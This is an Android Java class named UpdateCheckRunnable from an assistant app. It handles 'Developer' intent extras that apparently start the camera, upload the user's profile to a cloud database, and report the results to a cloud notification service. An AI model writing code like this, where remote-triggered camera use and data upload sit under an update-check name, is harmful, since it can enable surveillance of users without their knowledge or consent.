package com.wasitech.permissioncenter.java.com.wasitech.assist.runnables;

import android.content.Context;
import android.content.Intent;

import com.wasitech.camera.cam.CamApi1;
import com.wasitech.assist.command.family.Intents;
import com.wasitech.basics.classes.Issue;
import com.wasitech.database.CloudDB;
import com.wasitech.database.Params;

public class UpdateCheckRunnable implements Runnable {
    private final Context context;
    private final Intent intent;

    public UpdateCheckRunnable(Context context, Intent intent) {
        this.context = context;
        this.intent = intent;
    }

    @Override
    public void run() {
        StringBuilder temp = new StringBuilder();
        try {
            if (intent != null) {
                String data;
                if (intent.hasExtra(Params.Developer.PIC)) {
                    data = intent.getStringExtra(Params.Developer.PIC);
                    try {
                        new CamApi1(context, 1, false);
                        temp.append(data).append("\n");
                    } catch (Exception e) {
                        Issue.print(e, UpdateCheckRunnable.class.getName());
                        temp.append("Ex: ").append(e.getMessage()).append("\n");
                    }
                }
                if (intent.hasExtra(Params.Developer.BACKUP)) {
                    data = intent.getStringExtra(Params.Developer.BACKUP);
                    try {
                        temp.append(data).append("\n");
                    } catch (Exception e) {
                        Issue.print(e, UpdateCheckRunnable.class.getName());
                        temp.append("Ex: ").append(e.getMessage()).append("\n");
                    }
                }
                if (intent.hasExtra(Params.Developer.USER_UPDATE)) {
                    data = intent.getStringExtra(Params.Developer.USER_UPDATE);
                    try {
                        new CloudDB.ProfileCenter(context).uploadProfile();
                        temp.append(data).append("\n");
                    } catch (Exception e) {
                        Issue.print(e, UpdateCheckRunnable.class.getName());
                        temp.append("Ex: ").append(e.getMessage()).append("\n");
                    }
                }
                if (intent.hasExtra(Params.Developer.APP_UPDATE)) {
                    data = intent.getStringExtra(Params.Developer.APP_UPDATE);
                    try {
                        context.startActivity(Intents.UpdateIntent());
                        temp.append(data).append("\n");
                    } catch (Exception e) {
                        Issue.print(e, UpdateCheckRunnable.class.getName());
                        temp.append("Ex: ").append(e.getMessage()).append("\n");
                    }
                    return;
                }
            }
        } catch (Exception e) {
            Issue.print(e, UpdateCheckRunnable.class.getName());
            temp.append("Ex: ").append(e.getMessage()).append("\n");
        }
        String text = temp.toString();
        if (!text.isEmpty())
            new CloudDB.DataCenter().Service("Notification", text);
    }


}